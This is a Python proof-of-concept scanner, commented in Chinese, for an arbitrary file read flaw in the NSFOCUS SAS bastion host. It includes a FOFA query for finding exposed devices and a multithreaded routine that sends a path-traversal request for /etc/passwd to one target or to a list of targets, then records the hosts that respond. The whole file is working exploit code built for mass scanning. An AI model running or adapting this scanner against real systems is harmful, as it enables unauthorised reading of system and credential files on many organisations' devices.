# 绿盟sas安全审计系统任意文件读取漏洞
# FOFA：body="'/needUsbkey.php?username='"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """
\x1b[38m███████╗ █████╗ ███████╗        ██████╗ ███████╗ █████╗ ██████╗ ███████╗██╗██╗     ███████╗
\x1b[36m██╔════╝██╔══██╗██╔════╝        ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║██║     ██╔════╝
\x1b[34m███████╗███████║███████╗        ██████╔╝█████╗  ███████║██║  ██║█████╗  ██║██║     █████╗  
\x1b[35m╚════██║██╔══██║╚════██║        ██╔══██╗██╔══╝  ██╔══██║██║  ██║██╔══╝  ██║██║     ██╔══╝  
\x1b[31m███████║██║  ██║███████║███████╗██║  ██║███████╗██║  ██║██████╔╝██║     ██║███████╗███████╗
\x1b[33m╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝
                                                --author:Kucei
                                                --Version:绿盟 SAS堡垒机 GetFile 任意文件读取漏洞 1.0.0     
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("绿盟 SAS堡垒机 GetFile 任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd'
    headers = {
        'User-Agent':'Mozilla/4.0(compatible;MSIE8.0;Windows NT 6.1)'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    try:
        res1 = requests.get(url=target+url_payload,headers=headers,proxies=proxies,verify=False,timeout=5)
        # 匹配条件
        if res1.status_code == 200 and ':0:0:' in res1.text:
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
                print('\x1b[31m[+]\x1b[0m'+target+url_payload+'存在漏洞')
        else:
            print('[-]'+target+'不存在漏洞')
    except Exception:
        print(f":{target}--请求时出错--")

if __name__ == '__main__':
    main()